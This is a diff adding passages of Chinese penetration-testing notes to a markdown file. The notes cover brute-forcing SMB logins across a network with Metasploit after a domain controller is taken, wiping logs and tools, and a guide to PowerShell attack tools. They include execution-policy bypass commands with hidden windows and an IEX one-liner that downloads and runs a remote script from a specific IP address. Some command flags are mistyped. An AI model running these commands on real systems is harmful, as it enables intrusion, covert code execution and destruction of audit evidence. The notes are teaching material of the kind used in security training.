@@ -4429,51 +4429,194 @@ run
 
 
 
+#### 横向内网渗透
+
+这里可以参考《红日SEC内网渗透》
+
+
+
+#### 拿下域控
+
+我们有了域控，接下来只要快速在内网扩大控制权限就好
+
+- 利用当前获取的域控，对整个内网IP段进行扫描
+- 使用SMB下的smb_login模块
+- 端口转发或者Socks代理进内网
+
+我们先在Metasploiti添加路由，然后使用smb_login模块或者psexec_scanner模块进行爆破
+
+
+
+#### 清理日志
+
+清理日志主要有以下几个步骤
+
+- 删除之前添加的域管理账号
+- 删除所有在渗透过程中使用过的工具
+- 删除应用程序、系统和安全日志
+- 关闭所有的Meterpreter连接
 
 
 
 
 
+## PowerShell击指南
+
+### PowerShell简介
+
+Windows PowerShell是ー种命令行外売程序和脚本环境，我们可以把PowerShell看作命令行提示符cmd.exe的扩充。它具有令人难以置信的灵活性和功能化管理Windows系统的能力，无须写到磁盘中执行，它就可以直接在内存中运行。攻击者可以在一台计算机上运行代码，就会下载PowerShell脚本文件（.ps1）到磁盘中执行，利用PowerShell的诸多特点，攻击者可以持续攻击而不被轻易发现。
+
+PowerShell需要 .NET 环境的支持，同时支持 .NET 对象。其可读性、易用性，正吸引攻击者，使它逐渐成为一个非常流行且得力的攻击工具
 
 
 
+**PowerShell有以下这几个优点**
+
+- PowerShell脚本可以运行在内存中，不需要写入磁盘
+- 可以从另一个系统中下载PowerShell脚本并执行
+- 目前很多工具都是基于PowerShell开发的
+- 很多安全软件并不能检测到PowerShell的活动
+- cmd.exe通常会被阻止运行，但是PowerShell不会
+- 可以用来管理活动目录
 
 
 
+**各个Windows系统下的PowerShell版本**
+
+| 操作系统                           | PowerShell版本 | 是否可升级         |
+| ---------------------------------- | -------------- | ------------------ |
+| Windows7，Windows Server 2008      | 2.0            | 可以升级为3.0、4.0 |
+| Windows8，Windows Server 2012      | 3.0            | 可以升级为4.0      |
+| Windows8.1，Windows Server 2012 R2 | 4.0            | 否                 |
+
+查看PowerShell版本
+
+```
+Get-Host
+$PSVersionTable.PSVERSION
+```
+
+![image-20210324153454826](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210324153454826.png)
 
 
 
+**常用的PowerShell攻击工具**
+
+- **PowerSplit：**这是众多PowerShell攻击工具中被广泛使用的PowerShell后期漏同利用框架，常用于信息探测、特权提升、凭证窃取、持久化等操作。
+- **Nishang：**基于PowerShell的渗透测试专用工具，集成了框架、脚本和各种Payload，包含下载和执行、键盘记录、DNS、延时命令等脚本
+- **Empire：**基于PowerShell的远程控制木马，可以从凭证数据库中导出和跟踪凭证信息，常用于提供前期漏洞利用的集成模块、信息探测、凭据窃取、持久化控制
+- **PowerCat：**PowerShell版的Net Cat，有着网络工具中的“瑞士军刀”美誉，它能通过TCP和UDP在网络中读写数据。通过与其他工具结合和重定向
 
 
 
+### PowerShell的基本概念
+
+**1.PS1文件**
+
+一个PowerShell脚本其实就是一个简单的文本文件，这个文件包含了一系列PowerShell命令，**每个命令显示为独立的一行**，对于被视为PowerShell脚本的文本文件，它的**文件名需要加上 .PS1 的扩展名**
+
+**2.执行策略**
+
+为防止恶意脚本的执行，PowerShell有一个执行策略，**默认是受限的**。
+
+在PowerShell脚本无法执行时，使用**cmdlet命令**来更改执行策略
+
+- **Get-ExecutionPolicy**
+- **Restricted：**脚本不能运行（默认设置）
+- **RemoteSigned：**本地创建脚本可以运行，网络下载脚本不可运行（拥有数字证书签名的除外）
+- **AllSigned：**仅当脚本由受信任的发布者签名时才能运行
+- **Unrestricted：**允许所有的script运行
+
+使用以下cmdlet命令修改PowerShell的执行策略
+
+```
+Set-ExecutionPolicy <policy name>
+```
+
+**3.运行脚本**
+
+运行一个PowerShell脚本，必须键入完整的路径和文件名。和在Linux下执行Shell脚本的方法一样
+
+**4.管道**
+
+管道的作用是将一个命令的输出作为另一个命令的输入，两个命令之间用管道符号 `|` 连接
+
+例如停止所有目前运行中以 “P” 开头命名的程序
+
+```
+PS> get-process p* | stop-process
+```
 
 
 
+### PowerShell常用命令
+
+- **新建目录：**`New-Item test -type Directory`
+- **新建文件：**`New-Item test.txt -type File`
+- **删除目录或文件：**`Remove-Item 文件或目录`
+- **显示文本内容：**`get-content test.txt`
+- **设置文本的内容：**`set-content test.txt -value "hello"`
+- **追加内容：**`add-content test.txt -value "world"`
+- **清除内容：**`clear-content test.txt`
+- **查看 PowerShell 的执行策略：**`Get-ExecutionPolicy`
+- **设置 PowerShell 的执行策略：**`Set-ExecutionPolicy Unrestricted`
 
 
 
+### 绕过权限运行脚本
+
+如果要运行PowerShell脚本程序，必须用管理员权限将**Restricted策略**改成**Unrestricted策略**。**默认情况下无法直接执行！**
+
+所以在渗透时，就需要采用一些方法绕过策略来执行脚本，比如下面这三种
+
+- **绕过本地权限执行**
+
+  上传**test.ps1**至目标服务器，在CMD环境下，在目标服务器本地执行该脚本
+
+  ```
+  PowerShell.exe-ExecutionPolicy Bypass-File xxx.ps1
+  ```
+
+- **本地隐藏绕过权限执行脚本**
+
+  ```
+  PowerShell.exe-ExecutionPolicy Bypass-WindowStyle Hidden-Nolog-Nonlnteractive-NoProfile-File xxx.ps1
+  ```
+
+- **用IEX下载远程PS1脚本绕过权限执行**
+
+  ```
+  PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Nonl IEX(New-Object Net.WebClient).DownloadString("xxx.ps1");[Parameters]
+  
+  IEX(New-Object Net.WebClient).DownloadString("http://47.111.139.22:2333/123.ps1")
+  ```
+
+**参数详解**
+
+- **-ExecutionPolicy Bypass：**绕过执行安全策略
+- **-WindowStyle Hidden：**隐藏窗口
+- **-Nonl：**非交互模式
+- **-Noexit：**执行后不退出Shell，这在使用键盘记录等脚本时非常重要
+
+PowerShell脚本在默认情况下无法直接执行，这时就可以用上面的三种方法来绕过安全策略。
 
 
 
+### PowerSploit
+
+PowerSploit是一款基于PowerShell的后渗透（Post-Exploitation）框架软件，包含很多PowerShell攻击脚本，它们主要用于渗透中的信息侦察，权限提升，权限维持等。
+
+> GitHub项目地址：https://github.com/PowerShellMafia/PowerSploit
 
 
 
+#### PowerSploit安装
 
+我们直接git到VPS上，放到网页目录下我们就可以访问了
 
-
-## Powershell击指南
-
-
-
-
-
-
-
-
-
-
-
-
+```
+git clone https://github.com/PowerShellMafia/PowerSploit
+```
 
 
 
